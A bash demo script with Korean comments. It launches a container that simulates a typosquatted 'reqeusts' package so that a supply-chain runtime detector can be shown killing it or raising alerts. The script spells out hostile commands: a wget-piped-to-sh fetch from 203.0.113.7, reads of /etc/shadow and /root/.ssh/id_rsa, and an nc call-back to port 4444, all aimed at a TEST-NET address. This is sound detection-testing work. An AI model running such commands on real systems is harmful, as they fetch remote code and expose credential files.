#!/usr/bin/env bash
# 타이포스쿼팅 패키지를 흉내 낸 컨테이너. docs/00 §7 의 세 시나리오를 순서대로 일으킨다.
#   1) execve   — curl | sh 형태로 외부 스크립트 실행 시도
#   2) openat   — /etc/shadow, /root/.ssh/id_rsa 접근
#   3) connect  — 203.0.113.7:4444 (TEST-NET-3 이라 실제로 연결되지 않고 타임아웃)
# 기본 정책이면 첫 시나리오에서 kill 되고(ENFORCE_KILL=true), dry-run 이면 세 개 모두 알림으로 보인다.
# 반복 실행하려면 LOOP=1 을 준다. 컨테이너 이름은 pkg-reqeusts (mock 소스와 같은 이름).
set -euo pipefail
name=${NAME:-pkg-reqeusts}
docker rm -f "$name" >/dev/null 2>&1 || true
script='
  echo "[demo] typosquatted package reqeusts 1.0.2 post-install";
  while :; do
    echo "[demo] 1) exec: curl | sh";
    timeout 3 sh -c "wget -q -O- http://203.0.113.7/p.sh | sh" || true;
    sleep 2;
    echo "[demo] 2) open: /etc/shadow, /root/.ssh/id_rsa";
    cat /etc/shadow >/dev/null 2>&1 || true;
    cat /root/.ssh/id_rsa >/dev/null 2>&1 || true;
    sleep 2;
    echo "[demo] 3) connect: 203.0.113.7:4444";
    timeout 3 nc 203.0.113.7 4444 </dev/null >/dev/null 2>&1 || true;
    [ -n "$LOOP" ] || break;
    sleep 10;
  done;
  echo "[demo] done; idling"; sleep 3600
'
docker run -d --name "$name" --label supplyguard.demo=attacker \
  -e LOOP="${LOOP:-}" busybox sh -c "$script"
echo "$name started — 대시보드 이벤트 화면에서 붉은 판정을 확인하세요"
docker logs -f "$name" 2>&1 | sed 's/^/  /' &
sleep 12; kill %1 2>/dev/null || true
docker ps -a --filter "name=$name" --format 'status: {{.Status}}'
